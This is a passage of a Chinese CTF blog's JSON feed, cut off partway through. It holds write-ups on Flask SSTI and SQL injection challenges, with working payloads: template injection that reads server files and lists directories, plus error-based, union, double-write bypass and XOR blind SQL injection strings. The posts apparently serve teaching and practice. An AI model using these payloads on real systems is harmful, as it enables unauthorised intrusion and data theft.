debug：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvYUVwWTVQU0RNbEtUd0hmLnBuZw==\">https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png</span>&quot; alt=&quot;3.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>可以发现，在输出结果时有过滤，存在于 app.py 的 waf 中，百度一下 payload，尝试读取文件</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/W8zvhqFBGKiSnP5.png\" alt=\"3.5.png\"></p>\n<p>找到了被过滤的字符</p>\n<p>拼接 os 和 import 构造 payload 寻找目录：</p>\n<pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/mVvwtf8ODhnukRW.png\" alt=\"3.6.png\"></p>\n<p>然后拼接 flag，读取文件：</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/QqiFUklB1j2MESu.png\" alt=\"3.7.png\"></p>\n<p f8cc4e99-1ec3-49f2-b0be-b92686d4ff31>得到 flag</p>\n<h1 id=\"四-部分payload总结快速使用\"><a class=\"anchor\" href=\"#四-部分payload总结快速使用\">#</a> 四、部分 payload 总结，快速使用</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pby8yMDIxLzA2LzI4L2J1dSVFNCVCOCVBRCVFNyU5QSU4NCVFOSU4MyVBOCVFNSU4OCU4NnNzdGklRTglQTclQTMlRTklQTIlOTglRTglQkYlODclRTclQTglOEIv\">buu 中的部分 ssti 解题过程</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94aTRvcjB1amkuZ2l0aHViLmlvLzIwMTkvMDEvMTUvZmxhc2slRTQlQjklOEJzc3RpJUU2JUE4JUExJUU2JTlEJUJGJUU2JUIzJUE4JUU1JTg1JUE1LyMlRTYlOTQlQkIlRTUlODclQkI=\">flask 之 ssti 模板注入</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzc4MjMz\">ssti 详解与例题以及绕过 payload 大全</span></p>\n",
            "tags": [
                "SSTI"
            ]
        },
        {
            "id": "http://example.com/2021/06/21/ctf/web/sql/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/06/21/ctf/web/sql/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/",
            "title": "ctfweb-sql无列名注入",
            "date_published": "2021-06-20T17:04:45.964Z",
            "content_html": "<p>谈谈 sql 注入无列名的情况</p>\n<p>以及该如何解题</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"无列名注入\"><a class=\"anchor\" href=\"#无列名注入\">#</a> <em><strong>无列名注入</strong></em></h1>\n<p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p>\n<p>在大多数 CTF 题目中， <code>information_schema</code>  库被过滤，称为无列名注入。</p>\n<h1 id=\"方法总结\"><a class=\"anchor\" href=\"#方法总结\">#</a> 方法总结</h1>\n<h3 id=\"基于union-select的无列名注入\"><a class=\"anchor\" href=\"#基于union-select的无列名注入\">#</a> <em>基于 union select 的无列名注入</em></h3>\n<hr>\n<p>一般 sql 查询：</p>\n<pre><code class=\"language-mysql\">select * from admin\n</code></pre>\n<p>假设得到列名 id,name,password，则使用联合查询 union：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 union select * from admin\n</code></pre>\n<p>则，数字会替换成列名（联合查询的特性，拼接表），所以 1,2,3 分别对应了 id，name，password</p>\n<pre><code class=\"language-mysql\">select b from (select 1,2,3 as b union select * from admin)a\n</code></pre>\n<p>（b 是 3 的重命名，a 是任意字符，用于命名）</p>\n<p>如果需要查多个列，用 concat () 函数即可。</p>\n<p>order by  用不了的情况下，可以用 group by 代替。</p>\n<h3 id=\"基于join的无列名注入的场景与方法\"><a class=\"anchor\" href=\"#基于join的无列名注入的场景与方法\">#</a> 基于 join 的无列名注入的场景与方法</h3>\n<hr>\n<p>join 后的列名是两个表列名加起来的，可能会产⽣相同的列名，如 id 和 name，使⽤别名时，表中不能出现同的字段名，这就跟 join 第⼀个特点相冲突，所以在 join 和别名同时使⽤时会导致报错。</p>\n<p>当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名。</p>\n<p><strong>首先获取第一个列名</strong></p>\n<pre><code class=\"language-mysql\">?id=-1' union all select * from (select * from users as a join users as b)as c\n</code></pre>\n<p>as 主要作用是起别名，就是把 users 表当做 a 表，常规来说 as 可以省略</p>\n<p><strong>获取接下来的列名</strong></p>\n<pre><code class=\"language-mysql\">?id=-1' union all select*from (select * from users as a join users as b using(id,username))a\n</code></pre>\n<h3 id=\"利用sysschema_auto_increment_columns-库来进行查询\"><a class=\"anchor\" href=\"#利用sysschema_auto_increment_columns-库来进行查询\">#</a> 利用 sys.schema_auto_increment_columns 库来进行查询</h3>\n<hr>\n<p>由于 performance_schema 过于发杂，所以 mysql 在 5.7 版本中新增了 sys schemma，基础数据来自于 performance_chema 和 information_schema 两个库，本身数据库不存储数据</p>\n<p><strong>mysql 默认是关闭 InnoDB 存储引擎的</strong></p>\n<p>注入中在 mysql 默认情况下就可以替代 information_schema 库的方法</p>\n<p><strong>payload:</strong></p>\n<p><em>获取库名：</em></p>\n<pre><code class=\"language-mysql\">schema_auto_increment_columns \n?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+\n</code></pre>\n<pre><code class=\"language-mysql\">schema_table_statistics_with_buffer \n?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+\n</code></pre>\n<p><strong>限制</strong>：一般要超级管理员才可以访问 sys</p>\n<p>​\t\t\tmysql ≥ 5.7 版本</p>\n<p><em>获取字段名：</em></p>\n<p>用 join 方法或者无列名注入。</p>\n<h3 id=\"利用-innodb-中的库进行查询\"><a class=\"anchor\" href=\"#利用-innodb-中的库进行查询\">#</a> 利用 innodb 中的库进行查询</h3>\n<hr>\n<p>innodb_table_stats 存放库名</p>\n<p>innodb_table_index 存放表名</p>\n<p>使用方法同正常 sql 注入：</p>\n<pre><code class=\"language-mysql\">select table_name from mysql.innodb_table_stats where database_name=库名xxx\n</code></pre>\n<p>** 限制：** 表引擎为 innodb</p>\n<p>​\t\t\tmysql &gt; 5.5</p>\n<h3 id=\"通过报错来达到无列名查询目的\"><a class=\"anchor\" href=\"#通过报错来达到无列名查询目的\">#</a> 通过报错来达到无列名查询目的</h3>\n<hr>\n<p>爆库名：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where 1=abc();\n</code></pre>\n<p>爆表名：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where Polygon(id);\nselect 1,2,3 from users where linestring(id);\n</code></pre>\n<p>爆列名：</p>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where (select*from (select*from users as a join users as b)as c);\n</code></pre>\n<pre><code class=\"language-mysql\">select 1,2,3 from users where (select*from (select*from users as a join users as b using (id))as c);\n</code></pre>\n<p>前提是 users 表存在</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/06/20/ctf/web/sql/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/",
            "url": "http://example.com/2021/06/20/ctf/web/sql/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/",
            "title": "(ctfwp)sql注入极客大挑战",
            "date_published": "2021-06-20T09:25:52.913Z",
            "content_html": "<p>buuctf 极客大挑战系列    <em><strong>sql 注入</strong></em></p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"no1-easysql\"><a class=\"anchor\" href=\"#no1-easysql\">#</a> NO.1 EasySQL</h1>\n<p>题目如图：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvV3BZSzJFZmczQWRSam1RLnBuZw==\">https://i.loli.net/2021/06/21/WpYK2Efg3AdRjmQ.png</span>&quot; alt=&quot;easysql1&quot; style=&quot;zoom: 25%;&quot; /&gt;</p>\n<p>先尝试 万能密码</p>\n<pre><code>' or 1=1 #\n</code></pre>\n<p>结果一步得出答案...</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZGJ5RmZ1Tm0yendha3JSLnBuZw==\">https://i.loli.net/2021/06/21/dbyFfuNm2zwakrR.png</span>&quot; alt=&quot;easysql2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<h1 id=\"no2-lovesql\"><a class=\"anchor\" href=\"#no2-lovesql\">#</a> NO.2 LoveSQL</h1>\n<p>题目同上，没变化</p>\n<p>尝试万能密码，找不到有效信息</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvbjQ4TFVHMWs2b3hWbFFaLnBuZw==\">https://i.loli.net/2021/06/21/n48LUG1k6oxVlQZ.png</span>&quot; alt=&quot;love1&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<hr>\n<p>尝试报错注入，寻找其他库 / 表：</p>\n<pre><code>1'and extractvalue(1,concat('~',database()))#\n</code></pre>\n<p>顺利得到库名  geek</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZHhpYVhGUXFCNmNvcFo4LnBuZw==\">https://i.loli.net/2021/06/21/dxiaXFQqB6copZ8.png</span>&quot; alt=&quot;love2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>尝试爆表名：</p>\n<pre><code>1'and extractvalue(1,concat('~',(select table_name from information_schema.tables where table_schema=&quot;geek&quot;)))#\n</code></pre>\n<p>显示 结果超过一行（<em>Subquery returns more than 1 row</em>），添加 group_connat ()  函数解决。</p>\n<p>所以，输入</p>\n<pre><code>1'and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=&quot;geek&quot;)))#\n</code></pre>\n<p>得到表名 geekuser,l0ve1ysq1</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvb3Z1ZVB0YnNjR2sxNThqLnBuZw==\">https://i.loli.net/2021/06/21/ovuePtbscGk158j.png</span>&quot; alt=&quot;love3&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>尝试查表名，目测是第二个</p>\n<pre><code>1'and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name=&quot;l0ve1ysq1&quot;)))#\n</code></pre>\n<p>得到列名 id,username,password</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvbXZOWVFNR29MT0E1cDFaLnBuZw==\">https://i.loli.net/2021/06/21/mvNYQMGoLOA5p1Z.png</span>&quot; alt=&quot;love4&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>尝试获取信息</p>\n<pre><code>1'and extractvalue(1,concat('~',(select concat_ws('~',id,username,password) from l0ve1ysq1 where id=1)))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvQWd3Yk9WYW01Y0I5RkwyLnBuZw==\">https://i.loli.net/2021/06/21/AgwbOVam5cB9FL2.png</span>&quot; alt=&quot;love5&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>又查了几个 id 全是废话，直接爆破吧</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvVmgyakdBMWxYOEJiY3JhLnBuZw==\">https://i.loli.net/2021/06/21/Vh2jGA1lX8Bbcra.png</span>&quot; alt=&quot;love6&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvWUVENkxiNzhlcW5sazNQLnBuZw==\">https://i.loli.net/2021/06/21/YED6Lb78eqnlk3P.png</span>&quot; alt=&quot;love7&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>爆破得出 id=16 处有 flag 没显示全</p>\n<p>前半段</p>\n<pre><code>1'and extractvalue(1,concat('~',(select concat_ws('~',id,username,password) from l0ve1ysq1 where id=16)))#\n</code></pre>\n<p>后半段</p>\n<pre><code>1'and extractvalue(1,concat('~',(select substr(password,15,30) from l0ve1ysq1 where id=16)))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUlhoZlUycjhkN0dTNUNKLnBuZw==\">https://i.loli.net/2021/06/21/RXhfU2r8d7GS5CJ.png</span>&quot; alt=&quot;love8&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZkU2OEZ2WVhuUndWSE91LnBuZw==\">https://i.loli.net/2021/06/21/fE68FvYXnRwVHOu.png</span>&quot; alt=&quot;love9&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p fd752c8f-8f92-4b6f-93fa-0f99791741f0>得  flag</p>\n<h1 id=\"no3-babysql\"><a class=\"anchor\" href=\"#no3-babysql\">#</a> NO.3 BabySQL</h1>\n<p>老方法 万能密码走一遍，果然不行～</p>\n<p>选择做 FUZZ 模糊测试</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNVFjTzRDWkduYjM4MjdyLnBuZw==\">https://i.loli.net/2021/06/21/5QcO4CZGnb3827r.png</span>&quot; alt=&quot;baby1&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>不难发现 len 726 长度都被过滤成空 ''  所以显示没有输入，</p>\n<p>而 len 751 都没有被过滤，</p>\n<p>这种过滤比较简单，所以直接考虑 <strong>双写绕过</strong>。</p>\n<p>通过报错注入</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,database()))#\n</code></pre>\n<p>得到库名 geek</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvRXdTM296VEY4Nk1DUGxYLnBuZw==\">https://i.loli.net/2021/06/21/EwS3ozTF86MCPlX.png</span>&quot; alt=&quot;baby2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>继续爆表名</p>\n<pre><code> **1'oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere table_schema=&quot;geek&quot;)))#**     \n</code></pre>\n<p>得到表名 b4bsql,geekuser</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUVJBdEwxQjlZNEhUemVDLnBuZw==\">https://i.loli.net/2021/06/21/QRAtL1B9Y4HTzeC.png</span>&quot; alt=&quot;baby3&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>继续爆列名</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&quot;b4bsql&quot;)))#\n</code></pre>\n<p>得到列名 id,username,password</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaUpybmM4czFaQzlEbU9FLnBuZw==\">https://i.loli.net/2021/06/21/iJrnc8s1ZC9DmOE.png</span>&quot; alt=&quot;baby4&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>查询数据</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,(seselectlect concat_ws(0x7e,id,username,passwoorrd)frfromom b4bsql whwhereere id=1)))#\n</code></pre>\n<p>同上，又是一堆废话，直接爆破，得到 id=8 时有 flag</p>\n<p>剩下步骤同上一题</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaG10WHY3anFuSFdaRXlELnBuZw==\">https://i.loli.net/2021/06/21/hmtXv7jqnHWZEyD.png</span>&quot; alt=&quot;baby5&quot; style=&quot;zoom:33%;&quot; /&gt;</p>\n<p>后半部分</p>\n<pre><code>1'oorr extractvalue(1,concat(0x7e,(seselectlect subsubstrstr(passwoorrd,15,30)frfromom b4bsql whwhereere id=8)))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEva3dUaDRFOUlvY1ZRbmpxLnBuZw==\">https://i.loli.net/2021/06/21/kwTh4E9IocVQnjq.png</span>&quot; alt=&quot;baby6&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p 50ba0844-d76f-4a9a-892f-bc7694528c7e>得 flag</p>\n<h1 id=\"no4-hardsql\"><a class=\"anchor\" href=\"#no4-hardsql\">#</a> NO.4 HardSQL</h1>\n<p>万能密码走一下，失败</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvMXVqZUdjRno0bnJ2OWw4LnBuZw==\">https://i.loli.net/2021/06/21/1ujeGcFz4nrv9l8.png</span>&quot; alt=&quot;hard1&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>直接做 FUZZ 模糊测试</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvYU9XSXRmeDZpWFBLQkxrLnBuZw==\">https://i.loli.net/2021/06/21/aOWItfx6iXPKBLk.png</span>&quot; alt=&quot;hard2&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>如图，len 736 都被屏蔽了</p>\n<p>len 751 没被屏蔽，另外空格在实际输入中也被屏蔽了，所以空格用括号代替。</p>\n<p>尝试报错注入 **1'or (extractvalue (1,concat (0x7e,database ())))#</p>\n<p>顺利得到库名  geek</p>\n<p>图同上，略</p>\n<p>尝试爆表名</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where((table_schema)like(&quot;geek&quot;))))))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvQ1FpRUx1TXo3anRGMnNvLnBuZw==\">https://i.loli.net/2021/06/21/CQiELuMz7jtF2so.png</span>&quot; alt=&quot;hard3&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>得到表名 H4rDsq1</p>\n<p>尝试爆列名</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&quot;H4rDsq1&quot;))))))#\n</code></pre>\n<p>得 id,username,password</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaHROYVVCeFlSQ3dsYmpBLnBuZw==\">https://i.loli.net/2021/06/21/htNaUBxYRCwlbjA.png</span>&quot; alt=&quot;hard4&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>查找信息</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where((id)like(1))))))#\n</code></pre>\n<p>得 flag 前半段</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvdWQ4TDVBdHY3VnlOV0RyLnBuZw==\">https://i.loli.net/2021/06/21/ud8L5Atv7VyNWDr.png</span>&quot; alt=&quot;hard5&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>查后半段</p>\n<pre><code>1'or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)where((id)like(1))))))#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaVRmY3g4cHdReW1KRUxNLnBuZw==\">https://i.loli.net/2021/06/21/iTfcx8pwQymJELM.png</span>&quot; alt=&quot;hard6&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p 7725665e-c9b1-4558-b610-12bcccca00ce>flag</p>\n<h1 id=\"no5-finalsql\"><a class=\"anchor\" href=\"#no5-finalsql\">#</a> NO.5 FinalSQL</h1>\n<p>根据界面提示 本题可能为 sql 盲注</p>\n<p>所以先做 FUZZ 测试</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNFpBTllPcWp1M3MyUTVELnBuZw==\">https://i.loli.net/2021/06/21/4ZANYOqju3s2Q5D.png</span>&quot; alt=&quot;fin1&quot; style=&quot;zoom:33%;&quot; /&gt;</p>\n<p>可以发现，大部分语句被屏蔽，选择盲注。而点击 1 时，发现</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUGpIblNvUnlHSXpmdWw4LnBuZw==\">https://i.loli.net/2021/06/21/PjHnSoRyGIzful8.png</span>&quot; alt=&quot;fin2&quot; style=&quot;zoom:25%;&quot; /&gt;</p>\n<p>而输入 7 时</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNm1yemhuRXBTYWxna2NqLnBuZw==\">https://i.loli.net/2021/06/21/6mrzhnEpSalgkcj.png</span>&quot; alt=&quot;fin3&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>输入更大的超范围数同理，发现注入点</p>\n<p>用 FUZZ 测试，个别未被屏蔽，但报错信息被屏蔽</p>\n<p>最后我选择用异或 ^ 注入进行盲注：</p>\n<p>1^(sql 注入判断语句)</p>\n<p>如果显示（NO！），说明 id=1，进一步说明 sql 判断语句为 假</p>\n<p>如果显示（ERROR!!!），说明 id=0，进一步说明 sql 判断语句为 真</p>\n<p>写一个 py 跑</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvOGVRYVQ3ZnFNbmtYb0h3LnBuZw==\">https://i.loli.net/2021/06/21/8eQaT7fqMnkXoHw.png</span>&quot; alt=&quot;fin4&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<p>同理将 datebase () 替换为</p>\n<pre><code>(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek'))\n</code></pre>\n<p>再跑 &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvc0FlQjQ5YUNrZEY2bzVTLnBuZw==\">https://i.loli.net/2021/06/21/sAeB49aCkdF6o5S.png</span>&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>再换为</p>\n<pre><code>(select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y')\n</code></pre>\n<p>再跑 &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZEVYSTZPR29hSlBDckhCLnBuZw==\">https://i.loli.net/2021/06/21/dEXI6OGoaJPCrHB.png</span>&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<p>再换</p>\n<pre><code>(select(group_concat(passVord))from(F1naI1y))\n</code></pre>\n<p>再跑</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvc0dYdFNsUlY3UE11YUs1LnBuZw==\">https://i.loli.net/2021/06/21/sGXtSlRV7PMuaK5.png</span>&quot; alt=&quot;fin8&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>得出 flag</p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>写了一下午，当然，总结出一些 sql 相关的东西</p>\n<p>1. 页面上有显示位时，用联合注入 union；页面上没有显示位，但是有 SQL 语句执行错误信息输出时用报错注入</p>\n<p>2. 联合查询 先判断整型还是字符型，order by 查列数，获取库名，获取表名，获取字段名，获取数据</p>\n<p>3. 报错注入不用查列数，直接通过 extractvalue 函数报错查信息</p>\n<p>4. 当有绕过时，进行模糊测试，考虑是否为 双写绕过或空格绕过</p>\n<p>5. 若都不是，找可注入点进行盲注，一般这种题都会有可注入点让我们下手。盲注写 py 暴力破解即可。</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/06/16/running%20till%20the%20sun%20goes%20down/",
            "url": "http://example.com/2021/06/16/running%20till%20the%20sun%20goes%20down/",
            "title": "Running Till The Sun Goes Down",
            "date_published": "2021-06-16T08:45:29.595Z",
            "content_html": "<p>welcome to my blog, I'm Fanqie！</p>\n<p>查文章请看目录或搜索</p>\n<p>Then 友链贴了大佬和队友的博客</p>\n<p>And 网址有好东西～～</p>\n<hr>\n<p>请点击   more   阅读</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2021/06/16/(Test)%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bmarkdown%E8%AF%AD%E6%B3%95/",
            "url": "http://example.com/2021/06/16/(Test)%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bmarkdown%E8%AF%AD%E6%B3%95/",
            "title": "（Test）markdown语法复习",
            "date_published": "2021-06-16T08:24:31.783Z",
            "content_html": "<p>测试一下 blog，顺便复习一下 md 语法。</p>\n<p>测试软件为 Typora</p>\n<p><span id=\"more\"></span></p>\n<h2 id=\"一-标题\"><a class=\"anchor\" href=\"#一-标题\">#</a> 一、标题</h2>\n<p>、#  这是一级标题</p>\n<p>、## 这是二级标题</p>\n<p>、### 这是三级标题</p>\n<p>、#### 这是四级标题</p>\n<p>、##### 这是五级标题</p>\n<p>、###### 这是六级标题</p>\n<h2 id=\"二-字体\"><a class=\"anchor\" href=\"#二-字体\">#</a> 二、字体</h2>\n<p>加粗   <strong>这是加粗文字</strong></p>\n<p><strong><em>要加粗的文字左右分别用两个</em>号包起来</strong></p>\n<p>倾斜   <em>这是倾斜文字</em></p>\n<p><strong><em>要倾斜的文字左右分别用一个</em>号包起来</strong></p>\n<p>斜体加粗  <em><strong>这是斜体加粗文字</strong></em></p>\n<p><strong><em>要倾斜和加粗的文字左右分别用三个</em>号包起来</strong></p>\n<p>删除线   <s>这是加线文字</s></p>\n<p><em><strong>要加删除线的文字左右分别用两个～～号包起来</strong></em></p>\n<h2 id=\"三-引用\"><a class=\"anchor\" href=\"#三-引用\">#</a> 三、引用</h2>\n<p><em><strong>在引用的文字前加 &gt; 即可。引用也可以嵌套，如加两个 &gt;&gt; 三个 &gt;&gt;&gt;</strong></em></p>\n<blockquote>\n<p>&lt;u&gt; 这是引用的内容 &lt;/u&gt;</p>\n<blockquote>\n<p>&lt;u&gt; 这是引用的内容 &lt;/u&gt;</p>\n<blockquote>\n<p>&lt;u&gt; 这是引用过的内容 &lt;/u&gt;</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>这是引用的内容。。</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<h2 id=\"四-分割线\"><a class=\"anchor\" href=\"#四-分割线\">#</a> 四、分割线</h2>\n<p><strong>三个或者三个以上的 - 或者 * 都可以。</strong></p>\n<hr>\n<hr>\n<h2 id=\"五-图片\"><a class=\"anchor\" href=\"#五-图片\">#</a> 五、图片</h2>\n<p><em><strong>格式：![图片 alt](图片地址 '' 图片 title'')</strong></em></p>\n<p><em><strong>图片 alt 就是显示在图片下面的文字，相当于对图片内容的解释。</strong></em></p>\n<p><em><strong>图片 title 是图片的标题，当鼠标移到图片上时显示的内容。title 可加可不加。</strong></em></p>\n<p>示例</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" 